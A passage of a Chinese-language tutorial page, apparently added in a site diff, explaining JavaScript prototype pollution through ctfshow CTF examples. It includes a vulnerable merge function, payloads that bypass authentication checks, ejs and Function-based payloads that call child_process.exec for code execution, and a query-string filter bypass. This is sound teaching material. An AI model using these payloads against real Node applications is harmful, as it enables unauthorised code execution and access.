+</span></span><span style="display:flex;"><span><span style="color:#75715e">// foo.bar 此时为1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">bar</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 修改foo的原型（即Object）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">__proto__</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 由于查找顺序的原因，foo.bar仍然是1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">bar</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 此时再用Object创建一个空的zoo对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">zoo</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 查看zoo.bar
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">zoo</span>.<span style="color:#a6e22e">bar</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//尽管zoo为空对象，依然输出了1 1 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性
+</span></span></span></code></pre></div>
+<h2 id="使用场景">使用场景 <a href="#%e4%bd%bf%e7%94%a8%e5%9c%ba%e6%99%af" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>找到能控制的数组（对象）的键名的操作即可</p>
+<ul>
+<li>对象merge</li>
+<li>对象clone</li>
+</ul>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">target</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>])
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<p>存在<code>target[key]</code> = <code>source[key]</code>，如果<code>key</code>为<code>__proto__</code>呢</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o1</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o2</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;__proto__&#34;</span><span style="color:#f92672">:</span> {<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>}}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">o1</span>, <span style="color:#a6e22e">o2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">b</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 输出1 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">o3</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o3</span>.<span style="color:#a6e22e">b</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//输出空
+</span></span></span></code></pre></div>
+<p>合并成功了，但是原型链没有被污染。
+因为创建o2的过程<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>中，<code>__proto__&quot;</code>已经代表o2的原型了，遍历键名，得到的是<code>a，b</code>，而不是<code>a,__proto__</code>，也就无法修改原型</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o1</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">o2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">o1</span>, <span style="color:#a6e22e">o2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">o1</span>.<span style="color:#a6e22e">b</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">o3</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">o3</span>.<span style="color:#a6e22e">b</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//输出1 2 2，原型链被污染
+</span></span></span></code></pre></div>
+<p>因为在json解析下，<code>__proto__</code>是一个真正的键名，而不代表原型，后面遍历o2时也能正常获取键名。</p>
+<h2 id="例题">例题： <a href="#%e4%be%8b%e9%a2%98" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><h3 id="1">1 <a href="#1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>).<span style="color:#a6e22e">json</span>(),<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;flag_here&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secert</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">user</span>,<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">secert</span>.<span style="color:#a6e22e">ctfshow</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#39;36dboy&#39;</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">ret_code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">ret_msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;登录失败&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">user</span>)});  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+<p>因为存在<code>utils.copy</code>函数</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">object1</span>, <span style="color:#a6e22e">object2</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object2</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object2</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">object1</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">object1</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">object2</span>[<span style="color:#a6e22e">key</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">object1</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">object2</span>[<span style="color:#a6e22e">key</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
+<p>所以有原型链污染
+传入payload：</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__proto__&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;ctfshow&#34;</span>: <span style="color:#e6db74">&#34;36dboy&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<h3 id="2">2 <a href="#2" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>).<span style="color:#a6e22e">json</span>(),<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;api&#39;</span>, { <span style="color:#a6e22e">query</span><span style="color:#f92672">:</span> Function(<span style="color:#a6e22e">query</span>)(<span style="color:#a6e22e">query</span>)});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+<blockquote>
+<p>因为所有变量的最顶层是<code>object</code>，所以若当前上下文不存在<code>query</code>，会自动向上查找<code>object</code>的<code>query</code>属性，故可以进行原型链污染</p></blockquote>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;__proto__&#34;</span>:{<span style="color:#f92672">&#34;query&#34;</span>:<span style="color:#e6db74">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;</span>}}</span></span></code></pre></div>
+<h3 id="3">3 <a href="#3" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>).<span style="color:#a6e22e">json</span>(),<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;flag_here&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">userinfo</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isVIP</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isAdmin</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isAuthor</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">userinfo</span>,<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">isAdmin</span>){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">ret_code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">ret_msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;登录失败&#39;</span>});  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
+<p><code>user.__proto__</code>不是<code>Object</code>，是<code>f()</code>。<code>user.__proto__.__proto__</code>才是，所以需要污染两层。</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__proto__&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;__proto__&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;query&#34;</span>: <span style="color:#e6db74">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;id&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<h3 id="4">4 <a href="#4" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h3>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+<p>ejs rce</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;__proto__&#34;</span>:{<span style="color:#f92672">&#34;__proto__&#34;</span>:{<span style="color:#f92672">&#34;outputFunctionName&#34;</span>:<span style="color:#e6db74">&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;id&#39;);var __tmp2&#34;</span>}}}</span></span></code></pre></div>
+<h1 id="get绕过">get绕过 <a href="#get%e7%bb%95%e8%bf%87" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;html&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag_here&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/8c|2c|\,/ig</span>)){
+</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#39;where is flag :)&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">query</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">name</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#39;admin&#39;</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">password</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#39;ctfshow&#39;</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">isVIP</span><span style="color:#f92672">===</span><span style="color:#66d9ef">true</span>){
+</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#39;where is flag. :)&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
+<p>正常传入</p>
+
+
+    
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;ctfshow&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;isVIP&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<p>但过滤了<code>,</code>和<code>/2c</code>，所以即便<code>req.url</code>不进行url解码，也无法传入逗号。
+利用<code>req.query.query</code>的特性：传入的相同get参数会加入一个数组，然后<code>JSON.parse</code>会把数组内的元素拼接在一起。
+也就是传入<code>query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true}</code>的话，第一步得到<code>['{&quot;name&quot;:&quot;admin&quot;','&quot;password&quot;:&quot;ctfshow&quot;','&quot;isVIP&quot;:true}']</code>，第二步就是目标json。
+使用%63是防止<code>&quot;</code>编码后的<code>%22</code>和<code>C</code>变为<code>2c</code>被过滤。</p>
+
+    </div>
+
+    
+
+    
+                                            </div>
+                                            <div><hr class="doc-hr">
+<div id="doc-nav" class="d-print-none">
+</div></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+<footer class="shadow py-3 d-print-none">
+    <div class="container-fluid">
+        <div class="row align-items-center">
+            <div class="col">
+                <div class="text-sm-start text-center mx-md-2">
+                    <p class="mb-0">
+                        
+                        
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</main>
+            </div>
+        </div>
+
+        
+        
+        <button onclick="topFunction()" id="back-to-top" aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12,10.224l-6.3,6.3L4.32,15.152,12,7.472l7.68,7.68L18.3,16.528Z" style="fill:#fff"/></svg></button>
+        
+        
+
+        
+        
+
+
+
+
+    
+    
+    
+
+
+
+
+
+
+    <script src="/docs/js/bootstrap.js" defer></script>
+
+
+    <script type="text/javascript" src="http://localhost:1313/docs/js/bundle.js" defer></script>
+
+        
+
+        
+        <script type="module">
+    var suggestions = document.getElementById('suggestions');
+    var search = document.getElementById('flexsearch');
+
+    const flexsearchContainer = document.getElementById('FlexSearchCollapse');
+
+    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');
+
+    const configObject = { toggle: false }
+    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 
+
+    if (search !== null) {
+        document.addEventListener('keydown', inputFocus);
+        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
+            search.focus();
+        });
+        
+        var topHeader = document.getElementById("top-header");
+        document.addEventListener('click', function(elem) {
+            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
+                flexsearchContainerCollapse.hide();
+        });
+    }
+
+    hideFlexsearchBtn.addEventListener('click', () =>{
+        flexsearchContainerCollapse.hide()
+    })
+
+    function inputFocus(e) {
+        if (e.ctrlKey && e.key === '/') {
+            e.preventDefault();
+            flexsearchContainerCollapse.toggle();
+        }
+        if (e.key === 'Escape' ) {
+            search.blur();
+            
+            flexsearchContainerCollapse.hide();
+        }
+    };
+
+    document.addEventListener('click', function(event) {
+
+    var isClickInsideElement = suggestions.contains(event.target);
+
+    if (!isClickInsideElement) {
+        suggestions.classList.add('d-none');
+    }
+
+    });
+
+    
+
+
+    document.addEventListener('keydown',suggestionFocus);
+
+    function suggestionFocus(e) {
+    const suggestionsHidden = suggestions.classList.contains('d-none');
+    if (suggestionsHidden) return;
+
+    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
+    if (focusableSuggestions.length === 0) return;
+
+    const index = focusableSuggestions.indexOf(document.activeElement);
+
+    if (e.key === "ArrowUp") {
+        e.preventDefault();
+        const nextIndex = index > 0 ? index - 1 : 0;
+        focusableSuggestions[nextIndex].focus();
+    }
+    else if (e.key === "ArrowDown") {
+        e.preventDefault();
+        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
+        focusableSuggestions[nextIndex].focus();
+    }
+
+    }
+
+    
+
+
+    (function(){
+
+    var index = new FlexSearch.Document({
+        
+        tokenize: "forward",
+        minlength:  0 ,
+        cache:  100 ,
+        optimize:  true ,
+        document: {
+        id: 'id',
+        store: [
+            "href", "title", "description"
+        ],
+        index: ["title", "description", "content"]
+        }
+    });
+
+
+    
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
